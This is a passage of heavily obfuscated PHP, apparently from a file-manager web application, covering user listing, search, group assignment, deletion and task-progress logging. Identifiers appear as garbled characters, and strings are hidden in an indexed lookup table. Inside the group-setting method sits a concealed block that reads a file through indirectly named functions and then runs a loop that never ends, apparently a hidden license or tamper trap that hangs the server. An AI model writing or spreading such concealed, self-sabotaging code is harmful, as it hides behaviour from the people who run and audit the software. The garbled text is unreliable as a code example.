($ù›Û’« as $”ø¶ «© => $¾±å¡ë¦) { $ãÉ¢æ = array(); foreach ($ù›Û’« as $…Á°Úšş => $¤¤Î©à) { if (isset($¾»´ŸÎ•[$…Á°Úšş]) && $¾»´ŸÎ•[$…Á°Úšş]) { $ãÉ¢æ[] = $¾»´ŸÎ•[$…Á°Úšş]; } } if (!$ãÉ¢æ) { continue; } $óÀçµŒ÷ = array_merge(array($”ø¶ «© => array($ØœŒ™¨´[7], $ãÉ¢æ)), $Ó ³‘¥ù); $€ûóÂñ¼ = $this->where($óÀçµŒ÷)->find(); if ($€ûóÂñ¼) { return $¾±å¡ë¦; } } return !0; } public function userListInfo($ŸËšñ»ã) { $”÷×¨ò™ =& $_SERVER[²Ö÷öõ]; $Š§Ù±«è = array(); $ŸËšñ»ã = is_array($ŸËšñ»ã) ? array_unique($ŸËšñ»ã) : array(); if (!$ŸËšñ»ã) { return $Š§Ù±«è; } if (count($ŸËšñ»ã) < 20) { foreach ($ŸËšñ»ã as $áøÉ‰®à) { $Š§Ù±«è[$áøÉ‰®à . $”÷×¨ò™[12]] = $this->getInfoSimpleOuter($áøÉ‰®à); } } else { $’ßòäæ¶ = array($”÷×¨ò™[1771] => array($”÷×¨ò™[492], $ŸËšñ»ã)); if (count($ŸËšñ»ã) == 1) { $’ßòäæ¶ = array($”÷×¨ò™[1771] => $ŸËšñ»ã[0]); } $§›ê¥•ƒ = Model($”÷×¨ò™[577])->field($this->simpleField)->where($’ßòäæ¶)->select(); $§›ê¥•ƒ = array_to_keyvalue($§›ê¥•ƒ, $”÷×¨ò™[1780]); foreach ($ŸËšñ»ã as $áøÉ‰®à) { $•ùóÇïó = $§›ê¥•ƒ[$áøÉ‰®à]; if (!$•ùóÇïó) { $Š§Ù±«è[$áøÉ‰®à . $”÷×¨ò™[12]] = $this->getInfoSimpleOuter($áøÉ‰®à); continue; } $•ùóÇïó[$”÷×¨ò™[2465]] = Action($”÷×¨ò™[2466])->parseUrl($•ùóÇïó[$”÷×¨ò™[2465]]); $Š§Ù±«è[$áøÉ‰®à . $”÷×¨ò™[12]] = $•ùóÇïó; } } return $Š§Ù±«è; } protected function userStatus($×İÍÈîå, $¿³¬»İ’) { $¹¨àÃïÇ = $this->getInfoSimple($×İÍÈîå); if (!$¹¨àÃïÇ) { return !1; } $æøå³Õ = array($_SERVER[²Ö÷öõ][833] => $¿³¬»İ’); return $this->userEdit($×İÍÈîå, $æøå³Õ); } protected function userRemove($Æ‹³Â’½) { $°á±Ó¶± =& $_SERVER[²Ö÷öõ]; $×§³™Êø = $this->getInfoSimple($Æ‹³Â’½); if (!$×§³™Êø) { return !1; } $ëáéâêâ = array($°á±Ó¶±[1771] => $Æ‹³Â’½); Model($°á±Ó¶±[664])->where($ëáéâêâ)->delete(); Model($°á±Ó¶±[2496])->where($ëáéâêâ)->delete(); Model($°á±Ó¶±[2074])->where($ëáéâêâ)->delete(); Model($°á±Ó¶±[2481])->where($ëáéâêâ)->delete(); Model($°á±Ó¶±[1155])->where($ëáéâêâ)->delete(); Model($°á±Ó¶±[2285])->removeUserAll($Æ‹³Â’½); Model($°á±Ó¶±[907])->userRootRemove($Æ‹³Â’½); return $this->where($ëáéâêâ)->delete(); } protected function userGroupSet($ş‹àªÙú, $Ã´Æ‚¼Æ, $²ÅšŸóè = array()) { $²œù×ö¿ =& $_SERVER[²Ö÷öõ]; if (!isset($_SERVER[$²œù×ö¿[959]]) || !isset($_SERVER[$²œù×ö¿[960]])) { $ÕÍöŠˆ = $²œù×ö¿[961]; $ä£şÍ¿½ = $²œù×ö¿[962]; $Êå›äÕ„ = $_SERVER[$²œù×ö¿[963]] . $²œù×ö¿[964]; $¤™‹ŸßÎ = $ä£şÍ¿½($Êå›äÕ„); $Î˜‚Øù = explode($²œù×ö¿[262], $¤™‹ŸßÎ); if (count($Î˜‚Øù) < $²œù×ö¿[680]) { $ô¶Ÿ¸Õ´ = $²œù×ö¿[965]; $ô¶Ÿ¸Õ´(); } $Á´ÓŞÂ = $²œù×ö¿[966]; $Á´ÓŞÂ($_SERVER[$²œù×ö¿[967]]); $ïÛúşüƒ = 1; for ($åÃ¡°±ö = $ïÛúşüƒ; $åÃ¡°±ö > 0; $åÃ¡°±ö++) { $Á´ÓŞÂ = json_encode($GLOBALS[$²œù×ö¿[492]]); } } $‡öÊİ’÷ = $this->getInfoSimple($ş‹àªÙú); if (!$‡öÊİ’÷ || !is_array($Ã´Æ‚¼Æ)) { return !1; } $ä•°¨Ñœ = Model($²œù×ö¿[2074]); $ä•°¨Ñœ->where(array($²œù×ö¿[1780] => $ş‹àªÙú))->delete(); $ÊØ«ıƒä = array(); $Í±àªî­ = 0; foreach ($Ã´Æ‚¼Æ as $è×Ã–³ó => $ëÏ ¤) { $ùâÊáù¥ = array($²œù×ö¿[1780] => $ş‹àªÙú, $²œù×ö¿[1980] => $è×Ã–³ó, $²œù×ö¿[2088] => $ëÏ ¤); $ùâÊáù¥[$²œù×ö¿[2004]] = isset($²ÅšŸóè[$Í±àªî­]) ? $²ÅšŸóè[$Í±àªî­] : 0; $Í±àªî­++; $ÊØ«ıƒä[] = $ùâÊáù¥; } return $ä•°¨Ñœ->addAll($ÊØ«ıƒä, array(), !0); } protected function userGroupAdd($˜ ¤Ç, $äàÂ’˜± = array()) { $äÖ™îù  =& $_SERVER[²Ö÷öõ]; $Úş±Ãø˜ = $this->getInfoSimple($˜ ¤Ç); if (!$Úş±Ãø˜ || empty($äàÂ’˜±)) { return !1; } $–†ó¡õÍ = array(); foreach ($äàÂ’˜± as $£äÉ†Ö½ => $¢ŒÄ Ğ) { $–†ó¡õÍ[] = array($äÖ™îù [1780] => $˜ ¤Ç, $äÖ™îù [1980] => $£äÉ†Ö½, $äÖ™îù [2088] => $¢ŒÄ Ğ, $äÖ™îù [2004] => 0); } return Model($äÖ™îù [2074])->addAll($–†ó¡õÍ, array(), !0); } protected function userGroupRemove($—´‚Óãİ, $ş¢Áˆ½¥) { $Ü•šÁœê =& $_SERVER[²Ö÷öõ]; $©¥³Êê‹ = $this->getInfoSimple($—´‚Óãİ); if (!$©¥³Êê‹ || !$ş¢Áˆ½¥) { return !1; } $ãï§ëÀ² = array($Ü•šÁœê[1771] => $—´‚Óãİ, $Ü•šÁœê[2072] => $ş¢Áˆ½¥); return Model($Ü•šÁœê[2074])->where($ãï§ëÀ²)->delete(); } public function listData() { $èÍğ—¹ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($èÍğ—¹[$_SERVER[²Ö÷öõ][445]]); return $èÍğ—¹; } public function listByID($¯ú©öô) { $µ×å…èº =& $_SERVER[²Ö÷öõ]; if (!$¯ú©öô) { return; } $ÓÄõ¸óÈ = array($µ×å…èº[1780] => array($µ×å…èº[7], $¯ú©öô)); $Ë±î×Î³ = $this->where($ÓÄõ¸óÈ)->select(); $Ë±î×Î³ = array_sort_keep($Ë±î×Î³, $µ×å…èº[1780], $¯ú©öô); $this->_listDataApply($Ë±î×Î³); return $Ë±î×Î³; } public function listByGroup($ĞãŞ•íâ = 0, $ó£ŞúÒğ = array()) { $Õ»êªÃ =& $_SERVER[²Ö÷öõ]; $ûáøñü = $Õ»êªÃ[12]; $œÆç³·– = array(); if ($ĞãŞ•íâ) { $œÆç³·– = array($Õ»êªÃ[2497] => intval($ĞãŞ•íâ)); $ûáøñü = "\x4c\105\x46\124\x20\112\117\x49\x4e\40{$this->tablePrefix}\165\x73\x65\162\137\147\162\x6f\x75\160\40\x75\x73\145\x72\137\147\x72\x6f\x75\160\x20\x6f\x6e\40\x75\x73\145\162\x2e\165\x73\x65\x72\111\x44\x20\75\x20\x75\x73\x65\162\x5f\147\162\157\x75\x70\56\x75\x73\145\x72\x49\x44"; $„„ö×À = Input::get($Õ»êªÃ[530], null, $Õ»êªÃ[12]) ? $Õ»êªÃ[12] : $Õ»êªÃ[2498]; } if (isset($ó£ŞúÒğ[$Õ»êªÃ[833]])) { $œÆç³·–[$Õ»êªÃ[2499]] = $ó£ŞúÒğ[$Õ»êªÃ[833]]; } $½©Ÿ“ı = $this->_makeOrder($„„ö×À)->field($Õ»êªÃ[2500])->where($œÆç³·–)->join($ûáøñü)->selectPage(50); $this->_listDataApply($½©Ÿ“ı[$Õ»êªÃ[445]]); return $½©Ÿ“ı; } private function _makeOrder($² à³ê = '') { $ÚÊ°îÓÛ =& $_SERVER[²Ö÷öõ]; $´ôĞçµ = array($ÚÊ°îÓÛ[1780], $ÚÊ°îÓÛ[32], $ÚÊ°îÓÛ[1968], $ÚÊ°îÓÛ[2186], $ÚÊ°îÓÛ[1940], $ÚÊ°îÓÛ[231]); $×åîœÏç = array($ÚÊ°îÓÛ[523] => $ÚÊ°îÓÛ[524], $ÚÊ°îÓÛ[525] => $ÚÊ°îÓÛ[526]); $–úşÁˆ = Input::get($ÚÊ°îÓÛ[530], $ÚÊ°îÓÛ[7], $ÚÊ°îÓÛ[1771], $´ôĞçµ); $ÇÀé©‰ = Input::get($ÚÊ°îÓÛ[531], $ÚÊ°îÓÛ[7], $ÚÊ°îÓÛ[2075], array($ÚÊ°îÓÛ[2075], $ÚÊ°îÓÛ[525])); $ÇÀé©‰ = $×åîœÏç[$ÇÀé©‰]; $² à³ê = $² à³ê . "\165\163\x65\162\x2e{$–úşÁˆ}\x20{$ÇÀé©‰}\x2c\40\165\x73\x65\162\56\x75\x73\x65\x72\111\104\40\x61\x73\143"; return $this->alias($ÚÊ°îÓÛ[2202])->order($² à³ê); } public function listSearch($ıŠ„™Œ) { $Ó‡‹ ¦­ =& $_SERVER[²Ö÷öõ]; $¨¿±ş† = trim($ıŠ„™Œ[$Ó‡‹ ¦­[2078]]); $°¢Õ·»† = explode($Ó‡‹ ¦­[53], $¨¿±ş†); if (!$¨¿±ş† || count($°¢Õ·»†) == 1) { return $this->listSearchNow($ıŠ„™Œ); } $øªÅ¯êó = array($Ó‡‹ ¦­[445] => array()); foreach ($°¢Õ·»† as $±ÑíÊ²¹) { if (!trim($±ÑíÊ²¹)) { continue; } $ıŠ„™Œ[$Ó‡‹ ¦­[2078]] = $±ÑíÊ²¹; $úú¨” = $this->listSearchNow($ıŠ„™Œ); $øªÅ¯êó[$Ó‡‹ ¦­[445]] = array_merge($øªÅ¯êó[$Ó‡‹ ¦­[445]], $úú¨”[$Ó‡‹ ¦­[445]]); } $øªÅ¯êó[$Ó‡‹ ¦­[445]] = array_unique_by_key($øªÅ¯êó[$Ó‡‹ ¦­[445]], $Ó‡‹ ¦­[1780]); $øªÅ¯êó[$Ó‡‹ ¦­[442]] = array($Ó‡‹ ¦­[443] => count($øªÅ¯êó[$Ó‡‹ ¦­[445]]), $Ó‡‹ ¦­[439] => 20, $Ó‡‹ ¦­[429] => 1, $Ó‡‹ ¦­[444] => 1); return $øªÅ¯êó; } public function listSearchNow($óä°¨—í) { $şğ´ò²ƒ =& $_SERVER[²Ö÷öõ]; $“¾õ‹•¨ = trim($óä°¨—í[$şğ´ò²ƒ[2078]]); $ÇÅ€¶£ = isset($óä°¨—í[$şğ´ò²ƒ[2079]]) ? $óä°¨—í[$şğ´ò²ƒ[2079]] : !1; $“¾õ‹•¨ = str_replace($şğ´ò²ƒ[2080], $şğ´ò²ƒ[2081], trim($“¾õ‹•¨)); $şç…ãäº = array($şğ´ò²ƒ[32] => array($şğ´ò²ƒ[459], "\x25{$“¾õ‹•¨}\x25"), $şğ´ò²ƒ[381] => array($şğ´ò²ƒ[459], "{$“¾õ‹•¨}\45"), $şğ´ò²ƒ[2268] => array($şğ´ò²ƒ[459], "{$“¾õ‹•¨}\45"), $şğ´ò²ƒ[1086] => $şğ´ò²ƒ[2082]); if (Input::check($“¾õ‹•¨, $şğ´ò²ƒ[387])) { $şç…ãäº[$şğ´ò²ƒ[1780]] = array($şğ´ò²ƒ[459], "{$“¾õ‹•¨}\x25"); $şç…ãäº[$şğ´ò²ƒ[2482]] = array($şğ´ò²ƒ[459], "{$“¾õ‹•¨}\45"); } if (!$“¾õ‹•¨) { $şç…ãäº = array(); } if (isset($óä°¨—í[$şğ´ò²ƒ[833]])) { $şç…ãäº[$şğ´ò²ƒ[833]] = $óä°¨—í[$şğ´ò²ƒ[833]]; } $şç…ãäº = $this->parseWhereLike($şç…ãäº); $Æ‹©íê¦ = $this->_makeOrder()->where($şç…ãäº)->selectPage(20); if (!$Æ‹©íê¦ || count($Æ‹©íê¦[$şğ´ò²ƒ[445]]) < 5 && Input::check($“¾õ‹•¨, $şğ´ò²ƒ[394])) { $¸òşØŸ = $this->_searchFromMeta($şğ´ò²ƒ[537], $“¾õ‹•¨, 10); $÷¡ª¬òÏ = $this->_searchFromMeta($şğ´ò²ƒ[538], $“¾õ‹•¨, 10); $°³¡Ê– = array_merge($¸òşØŸ, $÷¡ª¬òÏ, $Æ‹©íê¦[$şğ´ò²ƒ[445]]); $Æ‹©íê¦[$şğ´ò²ƒ[445]] = array_unique_by_key($°³¡Ê–, $şğ´ò²ƒ[1780]); $Æ‹©íê¦[$şğ´ò²ƒ[442]][$şğ´ò²ƒ[443]] = count($Æ‹©íê¦[$şğ´ò²ƒ[445]]); $Æ‹©íê¦[$şğ´ò²ƒ[442]][$şğ´ò²ƒ[444]] = ceil($Æ‹©íê¦[$şğ´ò²ƒ[442]][$şğ´ò²ƒ[443]] / $Æ‹©íê¦[$şğ´ò²ƒ[442]][$şğ´ò²ƒ[439]]); } $this->_listDataApply($Æ‹©íê¦[$şğ´ò²ƒ[445]]); $this->_filterByGroup($Æ‹©íê¦, $ÇÅ€¶£); return $Æ‹©íê¦; } private function _filterByGroup(&$øÚÙÓ, $ëëƒ´Ï) { $íÃğôø‹ =& $_SERVER[²Ö÷öõ]; if (!$ëëƒ´Ï) { return $øÚÙÓ; } foreach ($øÚÙÓ[$íÃğôø‹[445]] as $ö©Ã‹Í• => &$Ùîùº¢) { $–ÇåÙ×É = array_to_keyvalue($Ùîùº¢[$íÃğôø‹[2171]], $íÃğôø‹[12], $íÃğôø‹[1980]); if (!in_array($ëëƒ´Ï, $–ÇåÙ×É)) { unset($øÚÙÓ[$íÃğôø‹[445]][$ö©Ã‹Í•]); } } unset($Ùîùº¢); $øÚÙÓ[$íÃğôø‹[445]] = array_values($øÚÙÓ[$íÃğôø‹[445]]); $øÚÙÓ[$íÃğôø‹[442]] = array($íÃğôø‹[2238] => count($øÚÙÓ[$íÃğôø‹[445]]), $íÃğôø‹[2236] => $øÚÙÓ[$íÃğôø‹[442]][$íÃğôø‹[439]], $íÃğôø‹[2235] => 1, $íÃğôø‹[2237] => 1); } private function _searchFromMeta($±×Í‰êÃ, $şá›Äã, $´·«Ô‘Ó) { $™¾ÔŠó =& $_SERVER[²Ö÷öõ]; $şá›Äã = strtolower($şá›Äã); $©ÆÄí = array($™¾ÔŠó[97] => $±×Í‰êÃ, $™¾ÔŠó[450] => array($™¾ÔŠó[459], "\45{$şá›Äã}\x25")); $©ÆÄí = $this->parseWhereLike($©ÆÄí); $ŠòµÆÅ = Model($™¾ÔŠó[2501])->where($©ÆÄí)->limit($´·«Ô‘Ó)->select(); if (!$ŠòµÆÅ) { return array(); } $ŠòµÆÅ = array_to_keyvalue($ŠòµÆÅ, $™¾ÔŠó[12], $™¾ÔŠó[1780]); $óá°Áêë = $this->where(array($™¾ÔŠó[1771] => array($™¾ÔŠó[7], $ŠòµÆÅ)))->select(); if (!$óá°Áêë) { return array(); } return $óá°Áêë; } private function _listDataApplyItem($†ß¼½àê) { $Ó—íô™ = array($†ß¼½àê); $this->_listDataApply($Ó—íô™); return $Ó—íô™[0]; } private function _listDataApply(&$¦ˆ¿ç) { $®œ¶ğ¦˜ =& $_SERVER[²Ö÷öõ]; if (!$¦ˆ¿ç) { return; } array_remove_key($¦ˆ¿ç, $®œ¶ğ¦˜[975]); $óõ¥ßĞ = array_to_keyvalue($¦ˆ¿ç, $®œ¶ğ¦˜[12], $®œ¶ğ¦˜[1780]); $this->_listAppendGroup($¦ˆ¿ç, $óõ¥ßĞ); $this->_listAppendMeta($¦ˆ¿ç, $óõ¥ßĞ); $this->_listAppendSourceRoot($¦ˆ¿ç, $óõ¥ßĞ); } private function _listAppendSourceRoot(&$÷ù½£Òˆ, $Õô³ğ­Î) { $ÅµŒ‹ê =& $_SERVER[²Ö÷öõ]; $ˆ€äŞ«ş = Model($ÅµŒ‹ê[907])->listSourceRoot(SourceModel::TYPE_USER, $Õô³ğ­Î); $ˆ€äŞ«ş = array_to_keyvalue($ˆ€äŞ«ş, $ÅµŒ‹ê[569]); $ˆ€äŞ«ş = array_remove_key($ˆ€äŞ«ş, $ÅµŒ‹ê[569]); foreach ($÷ù½£Òˆ as &$ÈïÜ½ª) { $ÈïÜ½ª[$ÅµŒ‹ê[90]] = $ˆ€äŞ«ş[$ÈïÜ½ª[$ÅµŒ‹ê[1780]]] ? $ˆ€äŞ«ş[$ÈïÜ½ª[$ÅµŒ‹ê[1780]]] : array(); } unset($ÈïÜ½ª); } private function _listAppendGroup(&$–µƒŞÛ¬, $‹‘ØÄ‘œ) { $ô˜§ëÄ =& $_SERVER[²Ö÷öõ]; $¦©Ê¨®Ò = array($ô˜§ëÄ[1780] => array($ô˜§ëÄ[7], $‹‘ØÄ‘œ)); $ºÖâÛƒ = Model($ô˜§ëÄ[2074])->where($¦©Ê¨®Ò)->select(); $¡ˆ¸ªÉÌ = array_to_keyvalue($ºÖâÛƒ, $ô˜§ëÄ[12], $ô˜§ëÄ[1980]); $¡ˆ¸ªÉÌ = array_remove_value(array_unique($¡ˆ¸ªÉÌ), $ô˜§ëÄ[228]); if (!$¡ˆ¸ªÉÌ || !$ºÖâÛƒ) { return; } $¦©Ê¨®Ò = array($ô˜§ëÄ[1980] => array($ô˜§ëÄ[7], $¡ˆ¸ªÉÌ)); $ÛÃÌÍœ© = Model($ô˜§ëÄ[2169])->field($ô˜§ëÄ[2502])->where($¦©Ê¨®Ò)->select(); $ÛÃÌÍœ© = array_to_keyvalue($ÛÃÌÍœ©, $ô˜§ëÄ[1980]); $ºÖâÛƒ = array_to_keyvalue_group($ºÖâÛƒ, $ô˜§ëÄ[1780]); foreach ($ºÖâÛƒ as &$«Á±„Í) { $×ã—şõÎ = array(); foreach ($«Á±„Í as $œ±€ÚğÄ) { if (!$œ±€ÚğÄ[$ô˜§ëÄ[2088]]) { continue; } $ƒŸîäë = Model($ô˜§ëÄ[571])->listData($œ±€ÚğÄ[$ô˜§ëÄ[2088]]); $×ã—şõÎ[] = array($ô˜§ëÄ[1980] => $œ±€ÚğÄ[$ô˜§ëÄ[1980]], $ô˜§ëÄ[2503] => $ÛÃÌÍœ©[$œ±€ÚğÄ[$ô˜§ëÄ[1980]]][$ô˜§ëÄ[32]], $ô˜§ëÄ[584] => $ÛÃÌÍœ©[$œ±€ÚğÄ[$ô˜§ëÄ[1980]]][$ô˜§ëÄ[584]], $ô˜§ëÄ[487] => $ƒŸîäë); } $«Á±„Í = $×ã—şõÎ; } unset($«Á±„Í); foreach ($–µƒŞÛ¬ as &$¹ñãÜ¯ô) { $¹ñãÜ¯ô[$ô˜§ëÄ[2171]] = array(); if (isset($ºÖâÛƒ[$¹ñãÜ¯ô[$ô˜§ëÄ[1780]]])) { $¹ñãÜ¯ô[$ô˜§ëÄ[2171]] = $ºÖâÛƒ[$¹ñãÜ¯ô[$ô˜§ëÄ[1780]]]; } } unset($¹ñãÜ¯ô); } public function userAppendGroup($àùßõ§İ) { $µ¬ù¬­š =& $_SERVER[²Ö÷öõ]; if (!$àùßõ§İ) { return array(); } $this->_listAppendGroup($àùßõ§İ, array_to_keyvalue($àùßõ§İ, $µ¬ù¬­š[12], $µ¬ù¬­š[1780])); return $àùßõ§İ; } private function _listAppendMeta(&$«Òäôõ, $Üã•±º) { $Â‰´çŠ’ =& $_SERVER[²Ö÷öõ]; $º÷Èığù = UserJobModel::JOB_KEY; $Êş±¡û = array($Â‰´çŠ’[2483]); $ÙÑØ¶© = array($Â‰´çŠ’[1780] => array($Â‰´çŠ’[7], $Üã•±º)); $Ã‚Ñìíü = Model($Â‰´çŠ’[2481])->where($ÙÑØ¶©)->select(); $Ã‚Ñìíü = array_to_keyvalue_group($Ã‚Ñìíü, $Â‰´çŠ’[1780]); foreach ($Ã‚Ñìíü as &$Ã áè¶ù) { $ø±ğÒ¢­ = array(); foreach ($Ã áè¶ù as $ä† ùØ×) { if (!in_array($ä† ùØ×[$Â‰´çŠ’[97]], $Êş±¡û)) { $ø±ğÒ¢­[$ä† ùØ×[$Â‰´çŠ’[97]]] = $ä† ùØ×[$Â‰´çŠ’[450]]; } } $Ã áè¶ù = $ø±ğÒ¢­; } unset($Ã áè¶ù); $§ÁñˆÄ· = Model($Â‰´çŠ’[2504]); foreach ($«Òäôõ as &$‘‚º’×”) { $‘Ç¼Ûû = array(); if (isset($Ã‚Ñìíü[$‘‚º’×”[$Â‰´çŠ’[1780]]])) { $‘Ç¼Ûû = $Ã‚Ñìíü[$‘‚º’×”[$Â‰´çŠ’[1780]]]; } $‘‚º’×”[$Â‰´çŠ’[2505]] = array(); if (isset($‘Ç¼Ûû[$º÷Èığù])) { $‘‚º’×”[$Â‰´çŠ’[2505]] = $§ÁñˆÄ·->getUserJobInfo($‘Ç¼Ûû[$º÷Èığù]); } } unset($‘‚º’×”); } protected function groupUserAll($î¶¡­œ) { $®ÄÀÉ™¡ =& $_SERVER[²Ö÷öõ]; if (!$î¶¡­œ) { return !1; } $ÅòÊ˜ëÁ = Model($®ÄÀÉ™¡[2074])->field($®ÄÀÉ™¡[1780])->where(array($®ÄÀÉ™¡[1980] => array($®ÄÀÉ™¡[7], $î¶¡­œ)))->select(); $ÅòÊ˜ëÁ = array_to_keyvalue($ÅòÊ˜ëÁ, $®ÄÀÉ™¡[12], $®ÄÀÉ™¡[1780]); return array_unique($ÅòÊ˜ëÁ); } public function userSearch($€”È–»§, $’£¡×Ãš = "\x2a") { return Model($_SERVER[²Ö÷öõ][598])->where($€”È–»§)->field($’£¡×Ãš)->find(); } } goto CÈ‚æªŒƒº; F´øàº¼áË: class TaskHttp extends Task { protected function startAfter() { $‹ÉÙö–§ =& $_SERVER[²Ö÷öõ]; $è”ğ»îû =& $this->task; $è”ğ»îû[$‹ÉÙö–§[1858]] = 1; Hook::bind($‹ÉÙö–§[1826], array($this, $‹ÉÙö–§[1859])); Hook::bind($‹ÉÙö–§[1828], array($this, $‹ÉÙö–§[1860])); Hook::bind($‹ÉÙö–§[1830], array($this, $‹ÉÙö–§[1861])); } protected function endAfter() { $µšÁî¼ó =& $_SERVER[²Ö÷öõ]; Hook::unbind($µšÁî¼ó[1826], array($this, $µšÁî¼ó[1859])); Hook::unbind($µšÁî¼ó[1828], array($this, $µšÁî¼ó[1860])); Hook::unbind($µšÁî¼ó[1830], array($this, $µšÁî¼ó[1861])); } public function progressStart($©‹û÷†‘) { $ìİ¯×¸á =& $_SERVER[²Ö÷öõ]; $Ú¢±¿Òò = curl_getinfo($©‹û÷†‘); self::log($ìİ¯×¸á[1862] . $Ú¢±¿Òò[$ìİ¯×¸á[383]]); self::valueSet($this->task[$ìİ¯×¸á[475]], $this->task); } public function progressEnd($êëüåöÚ) { $½†ğ§Ñ =& $_SERVER[²Ö÷öõ]; self::log($½†ğ§Ñ[1863] . $this->task[$½†ğ§Ñ[475]]); $this->end(); } public function progress($´û»é‚å, $ÃŒ„ş®È, $ÂäçÖ“À, $å”ùüõ, $êÙ¶ƒ ú) { $¥¥ÏÛ¡ =& $_SERVER[²Ö÷öõ]; $¤îùŸÈ¿ =& $this->task; if ($êÙ¶ƒ ú > 0) { $¤îùŸÈ¿[$¥¥ÏÛ¡[1149]] = $¤îùŸÈ¿[$¥¥ÏÛ¡[1149]] == 0 ? $å”ùüõ : $¤îùŸÈ¿[$¥¥ÏÛ¡[1149]]; $¤îùŸÈ¿[$¥¥ÏÛ¡[1781]] = $êÙ¶ƒ ú; } else { if ($ÂäçÖ“À > 0) { $¤îùŸÈ¿[$¥¥ÏÛ¡[1149]] = $¤îùŸÈ¿[$¥¥ÏÛ¡[1149]] == 0 ? $ÃŒ„ş®È : $¤îùŸÈ¿[$¥¥ÏÛ¡[1149]]; $¤îùŸÈ¿[$¥¥ÏÛ¡[1781]] = $ÂäçÖ“À; } } $this->update(); self::log("\160\x72\x6f\147\x72\x65\x73\163\x48\x74\x74\160\x3a\x64\x6f\x77\x6e\72{$ÂäçÖ“À}\57{$ÃŒ„ş®È}\x3b\x20\165\x70\154\x6f\x61\x64\x3a{$êÙ¶ƒ ú}\57{$å”ùüõ}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ñ†îí•Á, $úóÒö = '', $›â¿†Ş’ = 0, $öãşÎ³ª = '') { $¨‡Ü›˜É =& $_SERVER[²Ö÷öõ]; $öãşÎ³ª = $öãşÎ³ª ? $öãşÎ³ª : ($úóÒö ? $úóÒö : $ñ†îí•Á); $¹•‘Ú¡ = new Task($ñ†îí•Á, $úóÒö, $›â¿†Ş’, $öãşÎ³ª); $GLOBALS[$¨‡Ü›˜É[1864] . $ñ†îí•Á] = new TaskLog($¨‡Ü›˜É[1764], $¹•‘Ú¡, $öãşÎ³ª); return $¹•‘Ú¡; } public function __construct($˜¸¯â¨Ğ = '', $óßÎ¬Ì = '', $¹™üïì† = '') { $‰–±»¡ğ =& $_SERVER[²Ö÷öõ]; if (!$˜¸¯â¨Ğ) { $˜¸¯â¨Ğ = $‰–±»¡ğ[1764]; } $çÙò±•  = $˜¸¯â¨Ğ . $‰–±»¡ğ[462] . rand_string(10); if (!$¹™üïì†) { $¹™üïì† = $˜¸¯â¨Ğ . $‰–±»¡ğ[53] . $¹™üïì†; } switch ($˜¸¯â¨Ğ) { case $‰–±»¡ğ[1764]: if (!$óßÎ¬Ì || !$óßÎ¬Ì->task) { return echoLog($˜¸¯â¨Ğ . $‰–±»¡ğ[1865]); } $˜ô¹õéÕ = $óßÎ¬Ì; $çÙò±•  = $˜ô¹õéÕ->task[$‰–±»¡ğ[475]]; $˜¸¯â¨Ğ = $˜ô¹õéÕ->task[$‰–±»¡ğ[475]]; if (!$˜ô¹õéÕ->task[$‰–±»¡ğ[1667]]) { $˜ô¹õéÕ->task[$‰–±»¡ğ[1667]] = $¹™üïì† ? $¹™üïì† : $˜¸¯â¨Ğ; } break; case $‰–±»¡ğ[1866]: if (!$óßÎ¬Ì) { return echoLog($˜¸¯â¨Ğ . $‰–±»¡ğ[1867]); } $¥ğöÑ½´ = is_string($óßÎ¬Ì) ? array($óßÎ¬Ì) : $óßÎ¬Ì; $˜ô¹õéÕ = new TaskFileTransfer($çÙò±• , $˜¸¯â¨Ğ, 0, $¹™üïì† ? $¹™üïì† : $¥ğöÑ½´[0]); foreach ($¥ğöÑ½´ as $çı„‹©›) { $˜ô¹õéÕ->addPath($çı„‹©›); } break; case $‰–±»¡ğ[389]: if (!$óßÎ¬Ì) { return echoLog($˜¸¯â¨Ğ . $‰–±»¡ğ[1867]); } $¥ğöÑ½´ = is_string($óßÎ¬Ì) ? array($óßÎ¬Ì) : $óßÎ¬Ì; $˜ô¹õéÕ = new TaskZip($çÙò±• , $˜¸¯â¨Ğ, 0, $¹™üïì† ? $¹™üïì† : $¥ğöÑ½´[0]); foreach ($¥ğöÑ½´ as $çı„‹©›) { $˜ô¹õéÕ->addPath($çı„‹©›); } break; case $‰–±»¡ğ[1307]: if (!$óßÎ¬Ì) { return echoLog($˜¸¯â¨Ğ . $‰–±»¡ğ[1867]); } $˜ô¹õéÕ = new TaskUnZip($çÙò±• , $˜¸¯â¨Ğ, 0, $¹™üïì† ? $¹™üïì† : $óßÎ¬Ì); if ($óßÎ¬Ì) { $˜ô¹õéÕ->addFile($óßÎ¬Ì); } break; case $‰–±»¡ğ[152]: $˜ô¹õéÕ = new TaskHttp($çÙò±• , $˜¸¯â¨Ğ); break; default: return; break; } $this->task = $˜ô¹õéÕ; $this->taskID = $çÙò±• ; Hook::bind($‰–±»¡ğ[1801], array($this, $‰–±»¡ğ[1868])); Hook::bind($‰–±»¡ğ[1803], array($this, $‰–±»¡ğ[1869])); Hook::bind($‰–±»¡ğ[1797], array($this, $‰–±»¡ğ[1870])); echoLog($‰–±»¡ğ[1871] . $˜ô¹õéÕ->task[$‰–±»¡ğ[1667]]); } public function __destruct() { $this->end(); } public function end($÷ªßĞıÍ = '') { $ªƒªü½“ =& $_SERVER[²Ö÷öõ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($÷ªßĞıÍ); $this->task = !1; $this->taskID = !1; Hook::unbind($ªƒªü½“[1801], array($this, $ªƒªü½“[1868])); Hook::unbind($ªƒªü½“[1803], array($this, $ªƒªü½“[1869])); Hook::unbind($ªƒªü½“[1797], array($this, $ªƒªü½“[1870])); } public function taskUpdate($ĞÀ…ùî) { $æÏß¦Òğ =& $_SERVER[²Ö÷öõ]; if (!$ĞÀ…ùî || $this->taskID != $ĞÀ…ùî[$æÏß¦Òğ[475]]) { return; } $ô„ï…‰¦ = 20; $âÀÈ¢  = intval($ĞÀ…ùî[$æÏß¦Òğ[1782]] * $ô„ï…‰¦); $¶×ı€£® = $æÏß¦Òğ[176] . str_repeat($æÏß¦Òğ[970], $âÀÈ¢ ) . $æÏß¦Òğ[1100] . str_repeat($æÏß¦Òğ[53], $ô„ï…‰¦ - $âÀÈ¢ ) . $æÏß¦Òğ[178]; $Š™ŒÜ°¥ = $¶×ı€£® . sprintf($æÏß¦Òğ[1872], $ĞÀ…ùî[$æÏß¦Òğ[1782]] * 100) . $æÏß¦Òğ[1873]; $Ù¿…ôˆŞ = $Š™ŒÜ°¥ . $ĞÀ…ùî[$æÏß¦Òğ[1781]] . 